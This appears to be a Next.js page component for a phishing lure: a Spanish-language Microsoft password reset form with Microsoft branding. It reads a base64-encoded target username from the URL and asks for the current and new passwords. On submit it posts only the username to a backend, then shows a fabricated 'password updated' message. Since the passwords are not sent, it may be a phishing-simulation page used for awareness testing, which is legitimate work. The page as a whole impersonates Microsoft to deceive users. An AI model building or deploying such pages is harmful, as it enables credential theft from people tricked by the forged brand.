'use client';

import { useState, useEffect } from 'react';
import styles from './page.module.css';

export default function ResetPasswordPage() {
  const [username, setUsername] = useState<string | null>(null);
  const [currentPassword, setCurrentPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [errors, setErrors] = useState({ current: false, new: false, confirm: false });
  const [success, setSuccess] = useState(false);

  useEffect(() => {
    const raw = new URLSearchParams(window.location.search).get('username');
    if (raw) setUsername(atob(raw));
  }, []);

  function validate(): boolean {
    const e = {
      current: !currentPassword,
      new: newPassword.length < 8,
      confirm: newPassword !== confirmPassword,
    };
    setErrors(e);
    return !e.current && !e.new && !e.confirm;
  }

  async function handleSubmit() {
    if (!validate()) return;
    try {
      const res = await fetch('/api/reset-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username }),
      });
      const data = await res.json();
      if (res.ok) {
        setSuccess(true);
      } else {
        alert(data.error || 'Ocurrió un error. Inténtalo nuevamente.');
      }
    } catch {
      alert('Error de conexión. Inténtalo nuevamente.');
    }
  }

  return (
    <div className={styles.root}>
      <div className={styles.card}>
        <div className={styles['ms-logo']}>
          <div className={styles.grid}>
            <span></span><span></span>
            <span></span><span></span>
          </div>
          <span className={styles.brand}>Microsoft</span>
        </div>

        {!success ? (
          <>
            <h1>Restablecer la contraseña</h1>
            <p className={styles.subtitle}>
              Introduce una contraseña nueva. Las contraseñas distinguen entre mayúsculas y minúsculas y deben tener un mínimo de 8&nbsp;caracteres.
            </p>
            <div className={styles['account-display']}>{username}</div>

            <div className={styles['input-group']}>
              <label htmlFor="currentPassword">Contraseña actual</label>
              {errors.current && (
                <div className={`${styles['field-error']} ${styles.visible}`}>
                  Ingresa tu contraseña actual.
                </div>
              )}
              <input
                id="currentPassword"
                type="password"
                autoComplete="current-password"
                value={currentPassword}
                onChange={(e) => setCurrentPassword(e.target.value)}
              />
            </div>

            <div className={styles['input-group']}>
              <label htmlFor="newPassword">Nueva contraseña</label>
              {errors.new && (
                <div className={`${styles['field-error']} ${styles.visible}`}>
                  Mínimo 8 caracteres.
                </div>
              )}
              <input
                id="newPassword"
                type="password"
                autoComplete="new-password"
                value={newPassword}
                onChange={(e) => setNewPassword(e.target.value)}
              />
            </div>

            <div className={styles['input-group']}>
              <label htmlFor="confirmPassword">Vuelve a escribir la contraseña nueva</label>
              {errors.confirm && (
                <div className={`${styles['field-error']} ${styles.visible}`}>
                  Las contraseñas no coinciden.
                </div>
              )}
              <input
                id="confirmPassword"
                type="password"
                autoComplete="new-password"
                value={confirmPassword}
                onChange={(e) => setConfirmPassword(e.target.value)}
              />
            </div>

            <div className={styles.actions}>
              <button
                className={`${styles.btn} ${styles['btn-secondary']}`}
                onClick={() => history.back()}
              >
                Cancelar
              </button>
              <button
                className={`${styles.btn} ${styles['btn-primary']}`}
                onClick={handleSubmit}
              >
                Siguiente
              </button>
            </div>
          </>
        ) : (
          <div className={styles['success-view']}>
            <p className={styles['success-title']}>Tu contraseña se actualizó</p>
            <p className={styles['success-text']}>
              La información de seguridad de tu cuenta ha sido actualizada correctamente.
            </p>
            <p className={styles['success-account']}>{username}</p>
            <p className={styles['success-text']}>
              Ya puedes usar tu nueva contraseña para iniciar sesión en todos los servicios de Microsoft.
            </p>
            <div className={styles.actions}>
              <a
                href="https://outlook.office365.com"
                className={`${styles.btn} ${styles['btn-primary']}`}
                style={{ textDecoration: 'none' }}
              >
                Iniciar sesión
              </a>
            </div>
          </div>
        )}
      </div>

      <div className={styles.footer}>
        <a href="#">Términos de uso</a>
        <a href="#">Privacidad y cookies</a>
      </div>
    </div>
  );
}
